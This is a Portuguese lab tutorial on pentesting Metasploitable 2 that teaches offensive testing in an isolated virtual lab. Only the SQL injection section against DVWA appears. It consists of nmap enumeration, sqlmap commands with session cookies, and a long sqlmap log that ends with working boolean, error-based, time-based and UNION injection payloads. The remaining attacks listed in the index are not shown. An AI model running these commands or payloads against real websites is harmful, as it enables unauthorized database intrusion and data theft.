#  Aula Prática – Pentest Ofensivo com Metasploitable 2

---

## Índice

1. [Ataque – SQL Injection no DVWA](#1-ataque--sql-injection-no-dvwa)
   - Serviço: DVWA em Apache
   - Ferramenta: sqlmap
   - Verificações e Exploração
   - Extração de dados

2. [Ataque – Escalonamento via NFS](#2-ataque--escalonamento-via-nfs)
   - Serviço: NFS (porta 2049)
   - Ferramenta: mount, bash
   - CVE: CVE-1999-0633
   - Verificações e Exploração

3. [Ataque – Java RMI Registry](#3-ataque--java-rmi-registry)
   - Serviço: Java RMI (porta 1099)
   - Ferramenta: Metasploit
   - CVE: CVE-2011-3556
   - Verificações e Exploração

4. [Ataque – VNC Login](#4-ataque--vnc-login)
   - Serviço: VNC
   - Ferramenta: Metasploit
   - Verificações e Exploração

5. [Hydra - Brute force](#5-hydra---brute-force)
   - Ataques Telnet e VNC
   - Wordlists e Execução
   - Resultados

---

# Ataques Realizados



## 1. Ataque – SQL Injection no DVWA

- **Serviço:** DVWA em Apache  
- **Ferramenta:** sqlmap  
- **CVE:** sem CVE específico — ataque genérico  
- **Histórico:** SQL Injection é uma das vulnerabilidades mais antigas e prevalentes do mundo web. Desde os anos 2000, ataques SQLi foram usados para extrair, modificar ou destruir dados. O OWASP classifica essa falha como crítica.

### Verificações:
```bash
nmap -p 80 --script http-enum 192.168.100.11


┌──(kali㉿kali)-[~]
└─$ nmap -p 80 --script http-enum 192.168.100.11
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-03 02:00 UTC
Nmap scan report for 192.168.100.11
Host is up (0.00032s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /tikiwiki/: Tikiwiki
|   /test/: Test page
|   /phpinfo.php: Possible information file
|   /phpMyAdmin/: phpMyAdmin
|   /doc/: Potentially interesting directory w/ listing on 'apache/2.2.8 (ubuntu) dav/2'
|   /icons/: Potentially interesting folder w/ directory listing
|_  /index/: Potentially interesting folder
MAC Address: 08:00:27:56:5A:5B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.90 seconds

```

### Exploração:
```bash
sqlmap -u "http://192.168.100.11/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=..." --dbs
```

### Ataque completo

- Iremos utilizar o DVWA - Damn Vulnerable Web Application
- Precisamos de um session_id

#### Encontrar o PHPSESSID (Identificador de Sessão do DVWA)

Este identificador é necessário para usar ferramentas como o sqlmap com autenticação válida.


1. Acesse o DVWA no navegdor 

Abra o navegador no Kali Linux e vá para: http://192.168.100.11/dvwa

Faça login com:
- Usuário: admin
- Senha: password


2. Abre o Inspecionador do navegador 

No Firefox ou Chromium:
- Pressione CTRL + SHIFT + I
- Ou clique com o botão direito e escolha "Inspecionar"

3. Em armazenamento ou application 

- Firefox: clique em "Armazenamento" → Cookies → http://192.168.100.11
- Chromium: clique em "Application" → Cookies → http://192.168.100.11

4. Encontre a key "phpsessid" 


| Name       | Value                              |
|------------|-------------------------------------|
| PHPSESSID  | d5b344e80df39a1c7d5e1ae90d2719a9    |

Copie esse valor, pois ele será usado com a flag --cookie no sqlmap.


5. Exemplo de uso no  SQLMAP

Exemplo:

```bash
sqlmap -u "http://192.168.100.11/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="security=low; PHPSESSID=d5b344e80df39a1c7d5e1ae90d2719a9" --dbs
```

IMPORTANTE:
- O valor do PHPSESSID muda toda vez que você reinicia a sessão
- Sempre atualize o valor antes de rodar novamente o sqlmap

** Outro ponto para validar no DVWA, é deixa a segurança do site em "LOW" **

No navegador, no site do DVWA

    - Vá para DVWA Security
    - Verifique se está setado para: Low
    - Clique em Submit se necessário

Se estiver em "Medium", "High" ou "Impossible", o sqlmap não vai conseguir injetar.


#### Bora comececar... 

```
┌──(kali㉿kali)-[~]
└─$                                                 
┌──(kali㉿kali)-[~]
└─$ nmap -p 80 --script http-enum 192.168.100.11
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-03 02:00 UTC
Nmap scan report for 192.168.100.11
Host is up (0.00032s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /tikiwiki/: Tikiwiki
|   /test/: Test page
|   /phpinfo.php: Possible information file
|   /phpMyAdmin/: phpMyAdmin
|   /doc/: Potentially interesting directory w/ listing on 'apache/2.2.8 (ubuntu) dav/2'
|   /icons/: Potentially interesting folder w/ directory listing
|_  /index/: Potentially interesting folder
MAC Address: 08:00:27:56:5A:5B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.90 seconds
                                                                                                                       
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://192.168.100.11/dvwa/vulnerabilities/sqli/?id=1&Submit-Submit" --cokie="security=low;PHPSESSID=e64f45ec9240052e0f438a4fc1a59baf" --dbs
        ___
       __H__                                                                                                           
 ___ ___["]_____ ___ ___  {1.9.2#stable}                                                                               
|_ -| . [']     | .'| . |                                                                                              
|___|_  [)]_|_|_|__,|  _|                                                                                              
      |_|V...       |_|   https://sqlmap.org                                                                           

Usage: python3 sqlmap [options]

sqlmap: error: no such option: --cokie
                                                                                                                       
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://192.168.100.11/dvwa/vulnerabilities/sqli/?id=1&Submit-Submit" --cookie="security=low;PHPSESSID=e64f45ec9240052e0f438a4fc1a59baf" --dbs
        ___
       __H__                                                                                                           
 ___ ___[']_____ ___ ___  {1.9.2#stable}                                                                               
|_ -| . [)]     | .'| . |                                                                                              
|___|_  [(]_|_|_|__,|  _|                                                                                              
      |_|V...       |_|   https://sqlmap.org                                                                           

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 02:14:46 /2025-06-03/

[02:14:47] [INFO] testing connection to the target URL
[02:14:47] [INFO] checking if the target is protected by some kind of WAF/IPS
[02:14:47] [INFO] testing if the target URL content is stable
[02:14:47] [INFO] target URL content is stable
[02:14:47] [INFO] testing if GET parameter 'id' is dynamic
[02:14:47] [WARNING] GET parameter 'id' does not appear to be dynamic
[02:14:47] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
[02:14:47] [INFO] testing for SQL injection on GET parameter 'id'
[02:14:47] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[02:14:48] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[02:14:48] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[02:14:48] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[02:14:48] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[02:14:48] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[02:14:48] [INFO] testing 'Generic inline queries'
[02:14:48] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[02:14:48] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[02:14:48] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[02:14:49] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[02:14:49] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[02:14:49] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[02:14:49] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] y
[02:14:56] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[02:14:56] [WARNING] GET parameter 'id' does not seem to be injectable
[02:14:56] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'

[*] ending @ 02:14:56 /2025-06-03/

#lembrar de usar o PHPSESSID                                                     
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://192.168.100.11/dvwa/vulnerabilities/sqli/?id=1&Submit-Submit" --cookie="security=low;PHPSESSID=e64f45ec9240052e0f438a4fc1a59baf" --dbs
        ___
       __H__                                                                                                           
 ___ ___[(]_____ ___ ___  {1.9.2#stable}                                                                               
|_ -| . [,]     | .'| . |                                                                                              
|___|_  [']_|_|_|__,|  _|                                                                                              
      |_|V...       |_|   https://sqlmap.org                                                                           

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 02:16:01 /2025-06-03/

[02:16:02] [INFO] testing connection to the target URL
[02:16:02] [INFO] testing if the target URL content is stable
[02:16:02] [INFO] target URL content is stable
[02:16:02] [INFO] testing if GET parameter 'id' is dynamic
[02:16:02] [WARNING] GET parameter 'id' does not appear to be dynamic
[02:16:02] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
[02:16:02] [INFO] testing for SQL injection on GET parameter 'id'
[02:16:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[02:16:03] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[02:16:03] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[02:16:03] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[02:16:03] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[02:16:03] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[02:16:03] [INFO] testing 'Generic inline queries'
[02:16:03] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[02:16:04] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[02:16:04] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[02:16:04] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[02:16:04] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[02:16:04] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[02:16:04] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] n
[02:16:09] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[02:16:11] [WARNING] GET parameter 'id' does not seem to be injectable
[02:16:11] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'

[*] ending @ 02:16:11 /2025-06-03/

                                                                                                                       
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://192.168.100.11/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low;PHPSESSID=e64f45ec9240052e0f438a4fc1a59baf" --dbs
        ___
       __H__                                                                                                           
 ___ ___[,]_____ ___ ___  {1.9.2#stable}                                                                               
|_ -| . [.]     | .'| . |                                                                                              
|___|_  [.]_|_|_|__,|  _|                                                                                              
      |_|V...       |_|   https://sqlmap.org                                                                           

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 02:18:46 /2025-06-03/

[02:18:47] [INFO] testing connection to the target URL
[02:18:48] [INFO] testing if the target URL content is stable
[02:18:48] [INFO] target URL content is stable
[02:18:48] [INFO] testing if GET parameter 'id' is dynamic
[02:18:48] [WARNING] GET parameter 'id' does not appear to be dynamic
[02:18:48] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[02:18:48] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[02:18:48] [INFO] testing for SQL injection on GET parameter 'id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[02:19:40] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[02:19:40] [WARNING] reflective value(s) found and filtering out
[02:19:41] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[02:19:41] [INFO] testing 'Generic inline queries'
[02:19:41] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[02:19:42] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[02:19:43] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[02:19:44] [INFO] GET parameter 'id' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)' injectable (with --not-string="Me")                                                                                
[02:19:44] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[02:19:44] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[02:19:44] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[02:19:44] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[02:19:44] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[02:19:44] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[02:19:44] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[02:19:44] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[02:19:44] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[02:19:44] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[02:19:44] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[02:19:44] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[02:19:44] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[02:19:44] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[02:19:44] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[02:19:44] [INFO] GET parameter 'id' is 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable                                                                                                        
[02:19:44] [INFO] testing 'MySQL inline queries'
[02:19:44] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[02:19:44] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[02:19:44] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[02:19:44] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[02:19:44] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[02:19:45] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[02:19:45] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[02:19:55] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[02:19:55] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[02:19:55] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[02:19:55] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[02:19:55] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[02:19:55] [INFO] target URL appears to have 2 columns in query
[02:19:55] [INFO] GET parameter 'id' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
[02:19:55] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
[02:19:58] [INFO] testing if GET parameter 'Submit' is dynamic
[02:19:58] [WARNING] GET parameter 'Submit' does not appear to be dynamic
[02:19:58] [WARNING] heuristic (basic) test shows that GET parameter 'Submit' might not be injectable
[02:19:58] [INFO] testing for SQL injection on GET parameter 'Submit'
[02:19:58] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[02:19:58] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[02:19:58] [INFO] testing 'Generic inline queries'
[02:19:58] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[02:19:59] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[02:20:00] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[02:20:00] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[02:20:02] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[02:20:04] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[02:20:06] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[02:20:08] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[02:20:09] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[02:20:11] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[02:20:14] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[02:20:14] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[02:20:14] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[02:20:14] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[02:20:14] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[02:20:14] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[02:20:14] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[02:20:14] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[02:20:14] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[02:20:14] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[02:20:14] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[02:20:16] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[02:20:16] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[02:20:18] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[02:20:19] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[02:20:20] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[02:20:22] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[02:20:23] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[02:20:25] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[02:20:26] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[02:20:27] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[02:20:28] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[02:20:30] [INFO] testing 'MySQL >= 5.0 (inline) error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[02:20:30] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[02:20:32] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[02:20:33] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[02:20:35] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[02:20:37] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[02:20:38] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[02:20:40] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[02:20:40] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[02:20:41] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[02:20:41] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[02:20:41] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[02:20:41] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[02:20:41] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[02:20:41] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[02:20:41] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[02:20:41] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)'
[02:20:42] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)'
[02:20:42] [INFO] testing 'MySQL >= 5.6 error-based - ORDER BY, GROUP BY clause (GTID_SUBSET)'
[02:20:42] [INFO] testing 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)'
[02:20:42] [INFO] testing 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[02:20:42] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)'
[02:20:42] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)'
[02:20:42] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[02:20:42] [INFO] testing 'MySQL inline queries'
[02:20:42] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[02:20:42] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[02:20:43] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[02:20:43] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[02:20:44] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[02:20:45] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[02:20:45] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[02:20:46] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[02:20:47] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
[02:20:48] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
[02:20:49] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
[02:20:50] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
[02:20:50] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
[02:20:51] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
[02:20:52] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)'
[02:20:53] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query)'
[02:20:54] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK)'
[02:20:54] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query)'
[02:20:55] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK - comment)'
[02:20:56] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query - comment)'
[02:20:57] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK - comment)'
[02:20:58] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query - comment)'
[02:20:58] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
[02:20:59] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (comment)'
[02:21:00] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
[02:21:01] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)'
[02:21:02] [INFO] testing 'MySQL AND time-based blind (ELT)'
[02:21:04] [INFO] testing 'MySQL OR time-based blind (ELT)'
[02:21:05] [INFO] testing 'MySQL AND time-based blind (ELT - comment)'
[02:21:06] [INFO] testing 'MySQL OR time-based blind (ELT - comment)'
[02:21:07] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[02:21:07] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[02:21:08] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
[02:21:08] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
[02:21:08] [INFO] testing 'MySQL < 5.0.12 time-based blind - Parameter replace (BENCHMARK)'
[02:21:08] [INFO] testing 'MySQL > 5.0.12 time-based blind - Parameter replace (heavy query - comment)'
[02:21:08] [INFO] testing 'MySQL time-based blind - Parameter replace (bool)'
[02:21:08] [INFO] testing 'MySQL time-based blind - Parameter replace (ELT)'
[02:21:08] [INFO] testing 'MySQL time-based blind - Parameter replace (MAKE_SET)'
[02:21:08] [INFO] testing 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause'
[02:21:08] [INFO] testing 'MySQL < 5.0.12 time-based blind - ORDER BY, GROUP BY clause (BENCHMARK)'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] t
[02:21:13] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[02:21:14] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
[02:21:21] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
[02:21:31] [INFO] testing 'MySQL UNION query (NULL) - 11 to 20 columns'
[02:21:40] [INFO] testing 'MySQL UNION query (random number) - 11 to 20 columns'
[02:21:46] [INFO] testing 'MySQL UNION query (NULL) - 21 to 30 columns'
[02:21:56] [INFO] testing 'MySQL UNION query (random number) - 21 to 30 columns'
[02:22:03] [INFO] testing 'MySQL UNION query (NULL) - 31 to 40 columns'
[02:22:13] [INFO] testing 'MySQL UNION query (random number) - 31 to 40 columns'
[02:22:21] [INFO] testing 'MySQL UNION query (NULL) - 41 to 50 columns'
[02:22:30] [INFO] testing 'MySQL UNION query (random number) - 41 to 50 columns'
[02:22:41] [WARNING] GET parameter 'Submit' does not seem to be injectable
sqlmap identified the following injection point(s) with a total of 6873 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: id=1' OR NOT 9917=9917#&Submit=Submit

    Type: error-based
    Title: MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND ROW(1934,2866)>(SELECT COUNT(*),CONCAT(0x7162767871,(SELECT (ELT(1934=1934,1))),0x7162627671,FLOOR(RAND(0)*2))x FROM (SELECT 8090 UNION SELECT 2926 UNION SELECT 2133 UNION SELECT 9117)a GROUP BY x)-- befk&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 6718 FROM (SELECT(SLEEP(5)))EXzc)-- bvnd&Submit=Submit

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: id=1' UNION ALL SELECT CONCAT(0x7162767871,0x4f557761426666524b4d5348766b79735652444b535a705371626545645162594578727a76656244,0x7162627671),NULL#&Submit=Submit
---
[02:22:41] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
